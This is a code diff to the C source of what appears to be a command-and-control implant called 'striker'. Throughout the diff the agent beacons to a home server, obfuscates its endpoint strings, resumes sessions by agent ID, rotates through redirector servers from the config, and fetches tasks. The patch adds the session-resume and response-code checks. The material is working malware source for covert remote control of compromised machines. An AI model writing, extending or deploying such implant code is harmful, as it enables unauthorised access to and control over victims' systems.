@@ -8,7 +8,7 @@
 #include "striker.h"
 
 // Controls debug output
-// #define STRIKER_DEBUG
+#define STRIKER_DEBUG
 // Size of agent UID
 #define AGENT_UID_SIZE 17
 // Max task result size in bytes
@@ -536,6 +536,7 @@ void start_session(){
 
   CURL *curl;
   CURLcode res;
+  int rsp_code;
   // Build the common headers that will be used for GET and POST requests.
   struct curl_slist *get_headers = NULL, *post_headers = NULL;
   get_headers = curl_slist_append(get_headers, strs[1]);
@@ -550,20 +551,39 @@ void start_session(){
     cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
     tmp = cJSON_PrintUnformatted(info);
     cJSON_Delete(info);
-    unsigned char connected = 0;
+    unsigned char connected = 0, fresh_conn = 0;
     while (!(striker->abort || connected)){
       queue_seek(base_addrs, 0);
       while (!queue_exhausted(base_addrs)){
         strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
         resize_buffer(body, 0);
-        curl = init_curl(strs[3], body);
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
+        if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
+          curl = init_curl(strs[3], body);
+          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
+          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
+          fresh_conn = 1;
+        }else{ // Try to resume the session by checking if the agent ID is valid for the server.
+          char *url = malloc(64);
+          char fmt[] = "[OBFS_ENC]/agent/ping/%s";
+          snprintf(url, 64, obfs_decode(fmt), striker->uid);
+          curl = init_curl(url, body);
+          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
+          free(url);
+          fresh_conn = 0;
+        }
         res = curl_easy_perform(curl);
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
         curl_easy_cleanup(curl);
         if (res != CURLE_OK){
           #ifdef STRIKER_DEBUG
           fprintf(stderr, "[-] Error calling home %s: %s\n", BASE_URL, curl_easy_strerror(res));
+          #endif
+          sleep(striker->delay);
+          continue;
+        }
+        if (rsp_code != 200){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Non-200 response received: %d\n", rsp_code);
           #endif
           sleep(striker->delay);
           continue;
@@ -573,55 +593,59 @@ void start_session(){
       }
     }
   free(tmp);
-
-  // Parse the configuration received from the server.
-  char *config_str = buffer_to_string(body);
-  cJSON *config = cJSON_Parse(config_str);
-  #ifdef STRIKER_DEBUG
-  printf("[*] Agent config: %s\n", config_str);
-  #endif
-  if (!config){
-    #ifdef STRIKER_DEBUG
-    const char *error = cJSON_GetErrorPtr();
-    fprintf(stderr, "[-] Error parsing config: %s\n", error);
-    #endif
-    free(config_str);
+  if (!connected)
     goto end;
-  }
-  // Extract agent ID.
-  tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
-  if (tmp == NULL){
+
+  if (fresh_conn){ 
+    // Parse the configuration received from the server.
+    char *config_str = buffer_to_string(body);
+    cJSON *config = cJSON_Parse(config_str);
     #ifdef STRIKER_DEBUG
-    fprintf(stderr, "[-] No config received from server, exiting...\n");
+    printf("[*] Agent config: %s\n", config_str);
     #endif
+    if (!config){
+      #ifdef STRIKER_DEBUG
+      const char *error = cJSON_GetErrorPtr();
+      fprintf(stderr, "[-] Error parsing config: %s\n", error);
+      #endif
+      free(config_str);
+      goto end;
+    }
+    // Extract agent ID.
+    tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
+    if (tmp == NULL){
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[-] No config received from server, exiting...\n");
+      #endif
+      cJSON_Delete(config);
+      free(config_str);
+      goto end;
+    }
+    strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
+    // Extract redirectors.
+    // 1 - Delete all existing ones.
+    queue_seek(base_addrs, 0);
+    while (!queue_empty(base_addrs)){
+      char *url = queue_remove(base_addrs, 0);
+      free(url);
+    }
+    // 2 - Add the current base URL.
+    queue_put(base_addrs, strdup(BASE_URL));
+    // 3 - Load the other redirectors.
+    cJSON *rds = cJSON_GetObjectItemCaseSensitive(config, strs[8]);
+    size_t rds_count = cJSON_GetArraySize(rds);
+    while (rds_count > 0){
+      queue_put(base_addrs, strdup(cJSON_GetStringValue(cJSON_GetArrayItem(rds, 0))));
+      cJSON_DeleteItemFromArray(rds, 0);
+      rds_count--;
+    }
+    #ifdef STRIKER_DEBUG
+    printf("[+] Servers count: %ld\n", base_addrs->count);
+    #endif
+
     cJSON_Delete(config);
     free(config_str);
-    goto end;
   }
-  strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
-  // Extract redirectors.
-  // 1 - Delete all existing ones.
-  queue_seek(base_addrs, 0);
-  while (!queue_empty(base_addrs)){
-    char *url = queue_remove(base_addrs, 0);
-    free(url);
-  }
-  // 2 - Add the current base URL.
-  queue_put(base_addrs, strdup(BASE_URL));
-  // 3 - Load the other redirectors.
-  cJSON *rds = cJSON_GetObjectItemCaseSensitive(config, strs[8]);
-  size_t rds_count = cJSON_GetArraySize(rds);
-  while (rds_count > 0){
-    queue_put(base_addrs, strdup(cJSON_GetStringValue(cJSON_GetArrayItem(rds, 0))));
-    cJSON_DeleteItemFromArray(rds, 0);
-    rds_count--;
-  }
-  #ifdef STRIKER_DEBUG
-  printf("[+] Servers count: %ld\n", base_addrs->count);
-  #endif
-
-  cJSON_Delete(config);
-  free(config_str);
 
   char *tasksURL = malloc(URL_SIZE);
   snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
